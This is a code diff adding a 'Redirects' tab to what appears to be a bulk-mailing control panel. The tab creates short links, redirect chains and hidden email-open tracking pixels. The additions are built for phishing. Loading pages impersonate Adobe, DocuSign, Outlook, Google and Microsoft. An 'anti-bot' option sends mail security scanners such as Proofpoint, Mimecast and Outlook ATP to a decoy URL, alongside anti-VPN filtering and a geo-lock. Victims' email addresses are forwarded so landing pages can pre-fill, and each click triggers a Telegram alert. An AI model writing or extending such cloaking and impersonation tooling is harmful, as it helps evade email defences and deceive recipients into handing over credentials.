@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-  <meta name="version" content="v5.32.20260509-bulk-order">
+  <meta name="version" content="v5.33.20260510-redirects">
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
@@ -6007,6 +6007,400 @@ function TabFiles({filesList, uploadFile, deleteFile, renameFile, fileUploadLoad
 /* ════════════════════════════════════════
    TAB: TOOLS
 ════════════════════════════════════════ */
+/* ════════════════════════════════════════
+   TAB: REDIRECTS
+   Hosted short links + themed loading pages + chains + image pixel.
+   Backed by /api/redirects/* on the server.
+════════════════════════════════════════ */
+function TabRedirects({setHtmlBody, setTab, addLog, showPopup}) {
+  const [view, setView]         = React.useState("list");      // 'list' | 'create' | 'edit' | 'events'
+  const [editing, setEditing]   = React.useState(null);        // redirect id when view==='edit'
+  const [items, setItems]       = React.useState([]);
+  const [loading, setLoading]   = React.useState(false);
+  const [eventsFor, setEventsFor] = React.useState(null);      // {id, short_path, events:[]}
+
+  // ── Create-form state ──
+  const [draftType,    setDraftType]    = React.useState("single");      // single | chain | pixel
+  const [draftDest,    setDraftDest]    = React.useState("");
+  const [draftShort,   setDraftShort]   = React.useState("");
+  const [draftTheme,   setDraftTheme]   = React.useState("blank");
+  const [draftChain,   setDraftChain]   = React.useState([""]);          // chain link URLs
+  const [draftAntiBot, setDraftAntiBot] = React.useState(true);
+  const [draftAntiVPN, setDraftAntiVPN] = React.useState(false);
+  const [draftBotUrl,  setDraftBotUrl]  = React.useState("https://www.google.com/");
+  const [draftAllowGeo,setDraftAllowGeo]= React.useState("");
+  const [draftPreserveQ, setDraftPreserveQ] = React.useState(true);
+  const [draftTgNotify, setDraftTgNotify]   = React.useState(false);
+  const [draftAdvOpen, setDraftAdvOpen] = React.useState(false);
+  const [creating, setCreating]         = React.useState(false);
+  const [origin, setOrigin]             = React.useState(window.location.origin);
+
+  function resetDraft() {
+    setDraftType("single"); setDraftDest(""); setDraftShort("");
+    setDraftTheme("blank");
+    setDraftChain([""]);
+    setDraftAntiBot(true); setDraftAntiVPN(false);
+    setDraftBotUrl("https://www.google.com/");
+    setDraftAllowGeo(""); setDraftPreserveQ(true); setDraftTgNotify(false);
+    setEditing(null);
+  }
+
+  async function loadList() {
+    setLoading(true);
+    try {
+      const r = await apiCall("/api/redirects");
+      if (r.ok) { const d = await r.json(); setItems(d.redirects||[]); }
+    } catch(e) { addLog?.(`⚠ Load redirects: ${e.message}`,"err"); }
+    setLoading(false);
+  }
+  React.useEffect(()=>{ loadList(); }, []);
+
+  async function saveDraft() {
+    if (draftType !== "pixel" && !draftDest.trim() && draftType !== "chain") {
+      showPopup?.({title:"Missing", msg:"Destination URL required.", ico:"⚠️", type:"alert"}); return;
+    }
+    if (draftType === "chain" && !draftChain.filter(c=>c.trim()).length) {
+      showPopup?.({title:"Missing", msg:"At least one chain link required.", ico:"⚠️", type:"alert"}); return;
+    }
+    setCreating(true);
+    const body = {
+      type: draftType,
+      destination: (draftDest||"").trim(),
+      short_path:  (draftShort||"").trim(),
+      config: {
+        theme:           draftType === "pixel" ? "blank" : draftTheme,
+        antiBot:         draftAntiBot,
+        antiVPN:         draftAntiVPN,
+        botUrl:          (draftBotUrl||"").trim(),
+        allowCountries:  (draftAllowGeo||"").trim(),
+        preserveQuery:   draftPreserveQ,
+        telegramNotify:  draftTgNotify,
+        chainLinks:      draftType === "chain"
+          ? draftChain.map(c=>c.trim()).filter(Boolean)
+          : [],
+      },
+    };
+    try {
+      const url = editing ? `/api/redirects/${editing}` : "/api/redirects";
+      const r = await apiCall(url, {method:"POST", body: JSON.stringify(body)});
+      const d = await r.json();
+      if (!r.ok || d.error) throw new Error(d.error || `HTTP ${r.status}`);
+      addLog?.(`🔗 ${editing?"Updated":"Created"} redirect /r/${d.short_path||""}`,"inf");
+      resetDraft(); setView("list"); await loadList();
+    } catch(e) {
+      showPopup?.({title:"Save failed", msg: e.message, ico:"✗", type:"alert"});
+    } finally { setCreating(false); }
+  }
+
+  async function deleteRedirect(it) {
+    const ok = await showPopup?.({title:"Delete redirect",
+      msg:`Delete /r/${it.short_path}? Events log will be wiped too.`,
+      ico:"🗑", type:"confirm"});
+    if (!ok) return;
+    try {
+      const r = await apiCall(`/api/redirects/${it.id}/delete`, {method:"POST", body:"{}"});
+      if (!r.ok) throw new Error(`HTTP ${r.status}`);
+      addLog?.(`🗑 Deleted /r/${it.short_path}`,"inf");
+      await loadList();
+    } catch(e) { showPopup?.({title:"Delete failed", msg:e.message, ico:"✗", type:"alert"}); }
+  }
+
+  async function openEvents(it) {
+    setEventsFor({...it, events:[]});
+    setView("events");
+    try {
+      const r = await apiCall(`/api/redirects/${it.id}/events`);
+      const d = await r.json();
+      setEventsFor({...it, events: d.events||[]});
+    } catch(e) {
+      setEventsFor({...it, events: [], error: e.message});
+    }
+  }
+
+  function loadIntoEdit(it) {
+    setEditing(it.id);
+    setDraftType(it.type||"single");
+    setDraftDest(it.destination||"");
+    setDraftShort(it.short_path||"");
+    const cfg = it.config||{};
+    setDraftTheme(cfg.theme||"blank");
+    setDraftChain(cfg.chainLinks?.length ? cfg.chainLinks : [""]);
+    setDraftAntiBot(cfg.antiBot !== false);
+    setDraftAntiVPN(!!cfg.antiVPN);
+    setDraftBotUrl(cfg.botUrl||"https://www.google.com/");
+    setDraftAllowGeo(cfg.allowCountries||"");
+    setDraftPreserveQ(cfg.preserveQuery !== false);
+    setDraftTgNotify(!!cfg.telegramNotify);
+    setView("edit");
+  }
+
+  function copyUrlAndPaste(url) {
+    copyToClipboard(url);
+    addLog?.(`📋 Copied ${url}`,"inf");
+  }
+
+  /* ── HEADER ── */
+  return (
+    <div>
+      <div className="ph">
+        <div className="ph-title">🔗 Redirects</div>
+        <div className="ph-sub">Create themed short links, redirect chains, and email-open pixels.  Hosted on this server at <code>/r/&lt;short&gt;</code>.</div>
+      </div>
+
+      {view === "list" && (
+        <div>
+          <div className="row jb ac-center mb12">
+            <div className="row g8 ac-center">
+              <button className="btn btn-p btn-sm" onClick={()=>{resetDraft(); setDraftType("single"); setView("create");}}>+ Single Redirect</button>
+              <button className="btn btn-g btn-sm" onClick={()=>{resetDraft(); setDraftType("chain"); setView("create");}}>+ Redirect Chain</button>
+              <button className="btn btn-g btn-sm" onClick={()=>{resetDraft(); setDraftType("pixel"); setView("create");}}>+ Image Tracking</button>
+            </div>
+            <button className="btn btn-g btn-sm" onClick={loadList} disabled={loading}>{loading?"Refreshing…":"↻ Refresh"}</button>
+          </div>
+
+          {items.length === 0 && (
+            <div className="ib ib-i"><span className="ib-ic">ℹ</span><span>No redirects yet.  Create your first one above.</span></div>
+          )}
+
+          {items.length > 0 && (
+            <div className="card" style={{padding:0,overflow:"hidden"}}>
+              <div className="tw"><table>
+                <thead><tr>
+                  <th>Type</th><th>Short URL</th><th>Destination</th>
+                  <th>Theme</th><th>Clicks</th><th>Last hit</th><th>Created</th><th></th>
+                </tr></thead>
+                <tbody>
+                  {items.map(it => {
+                    const tIco = it.type==="chain"?"🔗":it.type==="pixel"?"🖼":"➡";
+                    return (
+                      <tr key={it.id}>
+                        <td><Bdg t={it.type==="pixel"?"a":it.type==="chain"?"ok":"n"}>{tIco} {it.type}</Bdg></td>
+                        <td><a href={it.url} target="_blank" rel="noreferrer" className="mono xs" style={{color:"var(--accent)"}}>{it.url}</a></td>
+                        <td className="xs" style={{maxWidth:280,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}} title={it.destination}>{it.destination||(it.config?.chainLinks?.length ? `${it.config.chainLinks.length} chain links` : "—")}</td>
+                        <td><Bdg>{it.config?.theme||"blank"}</Bdg></td>
+                        <td>{it.clicks||0}</td>
+                        <td className="xs">{it.last_hit?new Date(it.last_hit+'Z').toLocaleString():"—"}</td>
+                        <td className="xs">{it.created_at?new Date(it.created_at+'Z').toLocaleDateString():""}</td>
+                        <td className="row g4">
+                          <button className="btn btn-g btn-xs" onClick={()=>copyUrlAndPaste(it.url)}>📋</button>
+                          <button className="btn btn-g btn-xs" onClick={()=>openEvents(it)}>📊</button>
+                          <button className="btn btn-g btn-xs" onClick={()=>loadIntoEdit(it)}>✏</button>
+                          <button className="btn btn-d btn-xs" onClick={()=>deleteRedirect(it)}>✕</button>
+                        </td>
+                      </tr>
+                    );
+                  })}
+                </tbody>
+              </table></div>
+            </div>
+          )}
+        </div>
+      )}
+
+      {(view === "create" || view === "edit") && (
+        <div className="g2" style={{alignItems:"start"}}>
+          <div className="card">
+            <div className="row jb ac-center mb12">
+              <button className="btn btn-g btn-sm" onClick={()=>{ resetDraft(); setView("list"); }}>← Back</button>
+              <span className="card-title" style={{margin:0}}>
+                {editing?"Edit":"Create"} Redirect — {draftType}
+              </span>
+            </div>
+
+            {/* Type tabs */}
+            <div className="tab-bar mb16">
+              <button className={`tb ${draftType==="single"?"on":""}`} onClick={()=>setDraftType("single")}>➡ Single</button>
+              <button className={`tb ${draftType==="chain"?"on":""}`}  onClick={()=>setDraftType("chain")}>🔗 Chain</button>
+              <button className={`tb ${draftType==="pixel"?"on":""}`}  onClick={()=>setDraftType("pixel")}>🖼 Image Pixel</button>
+            </div>
+
+            {/* Destination — for single + pixel */}
+            {(draftType==="single" || draftType==="pixel") && (
+              <div className="mb12">
+                <label className="lbl">Destination URL{draftType==="pixel"?" (optional — pixel just logs opens)":""}</label>
+                <input value={draftDest} onChange={e=>setDraftDest(e.target.value)}
+                  placeholder={draftType==="pixel"?"(blank = open-tracking only, no redirect)":"https://example.com/page"}
+                  style={{fontSize:14,padding:"10px 12px"}}/>
+              </div>
+            )}
+
+            {/* Chain links */}
+            {draftType==="chain" && (
+              <div className="mb12">
+                <div className="row jb ac-center mb6">
+                  <label className="lbl" style={{margin:0}}>Chain Links</label>
+                  <button className="btn btn-g btn-xs" onClick={()=>setDraftChain([...draftChain, ""])}>+ Add link</button>
+                </div>
+                <div className="col g6">
+                  {draftChain.map((c,i)=>(
+                    <div key={i} className="row ac-center g6">
+                      <span className="dim2 xs" style={{minWidth:24,textAlign:"right",fontFamily:"var(--font-mono)"}}>#{i+1}</span>
+                      <input value={c} onChange={e=>setDraftChain(draftChain.map((x,j)=>j===i?e.target.value:x))}
+                        placeholder="https://step-1.example.com" style={{fontSize:13,padding:"8px 10px",flex:1}}/>
+                      <button className="btn btn-d btn-xs" disabled={draftChain.length<=1}
+                        onClick={()=>setDraftChain(draftChain.filter((_,j)=>j!==i))}>✕</button>
+                    </div>
+                  ))}
+                </div>
+                <div className="dim2 xs mt6">Each click bounces through the next link in order.  Final link is the actual destination.</div>
+              </div>
+            )}
+
+            {/* Short link */}
+            <div className="mb12">
+              <div className="row jb ac-center mb6">
+                <label className="lbl" style={{margin:0}}>Short Link Path {draftShort?<span className="dim2 xs">— /r/{draftShort.toLowerCase().replace(/[^a-z0-9_-]/g,"")}</span>:<span className="dim2 xs">— auto-generated if blank</span>}</label>
+                <button className="btn btn-g btn-xs" onClick={()=>setDraftShort(Math.random().toString(36).slice(2,10))}>↻ Generate</button>
+              </div>
+              <input value={draftShort} onChange={e=>setDraftShort(e.target.value.toLowerCase().replace(/[^a-z0-9_-]/g,""))}
+                placeholder="custom-path"
+                style={{fontSize:14,padding:"10px 12px",fontFamily:"var(--font-mono)"}}/>
+              <div className="dim2 xs mt4">Final URL: <code>{origin}/r/{draftShort||"<random>"}</code></div>
+            </div>
+
+            {/* Advanced options */}
+            <div className="mb12">
+              <button className="btn btn-g btn-sm w100" onClick={()=>setDraftAdvOpen(o=>!o)}>
+                {draftAdvOpen?"▲":"▼"} Advanced Options
+              </button>
+              {draftAdvOpen && (
+                <div className="col g10 mt12">
+                  {draftType !== "pixel" && (
+                    <Tog checked={draftAntiBot} onChange={setDraftAntiBot}
+                      label="Anti-bot / scanner blocking"
+                      desc="Detect known crawlers, link scanners (Outlook ATP, Proofpoint, Mimecast, Barracuda, etc.) and send them to the decoy URL instead."/>
+                  )}
+                  {draftType !== "pixel" && (
+                    <Tog checked={draftAntiVPN} onChange={setDraftAntiVPN}
+                      label="Anti-VPN heuristic"
+                      desc="Light header-based detection of VPN/proxy traffic — sends matches to the decoy URL."/>
+                  )}
+                  {draftType !== "pixel" && (
+                    <Tog checked={draftPreserveQ} onChange={setDraftPreserveQ}
+                      label="Forward path + query"
+                      desc="Append ?email=... etc. from the inbound URL to the destination so landing pages can pre-fill."/>
+                  )}
+                  <Tog checked={draftTgNotify} onChange={setDraftTgNotify}
+                    label="Telegram notification on each hit"
+                    desc="Sends a message to your linked Telegram on every click (or pixel open).  Requires Telegram linked in Account."/>
+                  {draftType !== "pixel" && (draftAntiBot || draftAntiVPN || draftAllowGeo) && (
+                    <div>
+                      <label className="lbl">Decoy / blocked redirect URL</label>
+                      <input value={draftBotUrl} onChange={e=>setDraftBotUrl(e.target.value)}
+                        placeholder="https://www.google.com/"
+                        style={{fontSize:13,padding:"9px 12px"}}/>
+                      <div className="dim2 xs mt4">Bots / VPNs / out-of-region visitors land here instead.</div>
+                    </div>
+                  )}
+                  {draftType !== "pixel" && (
+                    <div>
+                      <label className="lbl">Geo-lock allowed countries (ISO codes, comma-separated)</label>
+                      <input value={draftAllowGeo} onChange={e=>setDraftAllowGeo(e.target.value)}
+                        placeholder="US, CA, GB"
+                        style={{fontSize:13,padding:"9px 12px"}}/>
+                      <div className="dim2 xs mt4">Empty = allow everywhere.  Reads CloudFront/CF country header.</div>
+                    </div>
+                  )}
+                </div>
+              )}
+            </div>
+
+            <div className="row g8 mt16">
+              <button className="btn btn-p" onClick={saveDraft} disabled={creating}>
+                {creating?"Saving…":(editing?"Save Changes":"Create Redirect")}
+              </button>
+              <button className="btn btn-g" onClick={()=>{ resetDraft(); setView("list"); }}>Cancel</button>
+            </div>
+          </div>
+
+          {/* Right: theme picker + preview */}
+          <div className="card">
+            {draftType !== "pixel" && (
+              <>
+                <div className="card-title">Loading Page Theme</div>
+                <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:8,marginBottom:16}}>
+                  {[
+                    {id:"blank",     ico:"☰",  name:"Blank"},
+                    {id:"adobe",     ico:"🅰", name:"Adobe"},
+                    {id:"docusign",  ico:"📑", name:"DocuSign"},
+                    {id:"outlook",   ico:"📮", name:"Outlook"},
+                    {id:"google",    ico:"🌐", name:"Google"},
+                    {id:"microsoft", ico:"🪟", name:"Microsoft"},
+                  ].map(t => (
+                    <button key={t.id}
+                      className="card card-sm"
+                      style={{padding:"14px 8px",cursor:"pointer",
+                              borderColor: draftTheme===t.id ? "var(--accent)" : "var(--border)",
+                              borderWidth: draftTheme===t.id ? 2 : 1,
+                              background: draftTheme===t.id ? "var(--bg3)" : "var(--bg2)"}}
+                      onClick={()=>setDraftTheme(t.id)}>
+                      <div style={{fontSize:24}}>{t.ico}</div>
+                      <div style={{fontSize:11,marginTop:6}}>{t.name}</div>
+                    </button>
+                  ))}
+                </div>
+                <div className="dim2 xs mb12">Choose what users see for ~1 second before they land on your destination.</div>
+              </>
+            )}
+
+            {draftType === "pixel" && (
+              <>
+                <div className="card-title">🖼 Image Tracking Pixel</div>
+                <div className="dim sm mb12">
+                  Paste this 1×1 transparent PNG anywhere in your email's HTML body.  Every time a recipient opens the email, the pixel loads and we log an "open" event.
+                </div>
+                {editing ? (
+                  <pre className="code" style={{fontSize:11,whiteSpace:"pre-wrap",padding:"10px 12px"}}>
+{`<img src="${origin}/r/${draftShort}/pixel.png" width="1" height="1" alt="" style="display:none">`}
+                  </pre>
+                ) : (
+                  <div className="ib ib-i sm"><span className="ib-ic">ℹ</span><span>Save the redirect first — the embed code appears here once it has a short path.</span></div>
+                )}
+              </>
+            )}
+          </div>
+        </div>
+      )}
+
+      {view === "events" && eventsFor && (
+        <div>
+          <div className="row jb ac-center mb12">
+            <div>
+              <div className="card-title" style={{margin:0}}>📊 Events for /r/{eventsFor.short_path}</div>
+              <div className="dim2 sm">{eventsFor.events?.length||0} most recent events (max 500)</div>
+            </div>
+            <button className="btn btn-g btn-sm" onClick={()=>setView("list")}>← Back</button>
+          </div>
+          <div className="card" style={{padding:0,overflow:"hidden"}}>
+            <div className="tw"><table>
+              <thead><tr><th>Time</th><th>Decision</th><th>IP</th><th>Country</th><th>UA</th><th>Target</th><th>Step</th></tr></thead>
+              <tbody>
+                {(eventsFor.events||[]).map(ev=>{
+                  const t = ev.decision==="pass"?"ok":ev.decision==="open"?"a":"e";
+                  return (
+                    <tr key={ev.id}>
+                      <td className="xs">{new Date(ev.ts+'Z').toLocaleString()}</td>
+                      <td><Bdg t={t}>{ev.decision}</Bdg></td>
+                      <td className="mono xs">{ev.ip||"—"}</td>
+                      <td className="xs">{ev.country||"—"}</td>
+                      <td className="xs" style={{maxWidth:300,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}} title={ev.ua}>{ev.ua||"—"}</td>
+                      <td className="xs" style={{maxWidth:240,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}} title={ev.target}>{ev.target||"—"}</td>
+                      <td>{ev.step||0}</td>
+                    </tr>
+                  );
+                })}
+                {(!eventsFor.events || eventsFor.events.length===0) && (
+                  <tr><td colSpan="7" className="dim2 sm" style={{textAlign:"center",padding:24}}>No events yet — share the link to see hits land here.</td></tr>
+                )}
+              </tbody>
+            </table></div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
 function TabTools({filesList, uploadFile, setLeadsRaw, setLeads, setTab,
                    setSubject, setHtmlBody, setPlainBody,
                    showPopup, addLog}) {
@@ -9788,6 +10182,7 @@ function App() {
     {id:"tags",        ico:"🏷️", lbl:"Tags & Templates"},
     null,
     {id:"files",       ico:"📁", lbl:"Files",    badge:filesList.length>0?String(filesList.length):null},
+    {id:"redirects",   ico:"🔗", lbl:"Redirects"},
     {id:"tools",       ico:"🔧", lbl:"Tools"},
     {id:"account",     ico:"👤", lbl:"Account"},
     {id:"logs",        ico:"🔍", lbl:"Debug"},
@@ -9994,6 +10389,7 @@ function App() {
       case "tools":       return <>{isMobile&&<MobTopBar/>}<TabTools filesList={filesList} uploadFile={uploadFile} setLeadsRaw={setLeadsRaw} setLeads={setLeads} setTab={setTab}
                                           setSubject={setSubject} setHtmlBody={setHtmlBody} setPlainBody={setPlainBody}
                                           showPopup={showPopup} addLog={addLog}/>{isMobile&&<MobSpacer/>}</>;
+      case "redirects":   return <>{isMobile&&<MobTopBar/>}<TabRedirects setHtmlBody={setHtmlBody} setTab={setTab} addLog={addLog} showPopup={showPopup}/>{isMobile&&<MobSpacer/>}</>;
       case "account":     return <>{isMobile&&<MobTopBar/>}<TabAccount username={username} role={role} doLogout={doLogout}
                                           updateInfo={updateInfo} updateApplying={updateApplying}
                                           updateAutoCheck={updateAutoCheck} setUpdateAutoCheck={setUpdateAutoCheck}
@@ -10192,6 +10588,7 @@ function App() {
         ];
         const MOB_MORE = [
           {id:"tools",       ico:"🔧",lbl:"Tools"},
+          {id:"redirects",   ico:"🔗",lbl:"Redirects"},
           {id:"proxies",     ico:"🌐",lbl:"Proxies",     badge:proxies.length>0?proxies.length:null},
           {id:"attachments", ico:"📎",lbl:"Attachments"},
           {id:"tags",        ico:"🏷️",lbl:"Tags & Templates"},
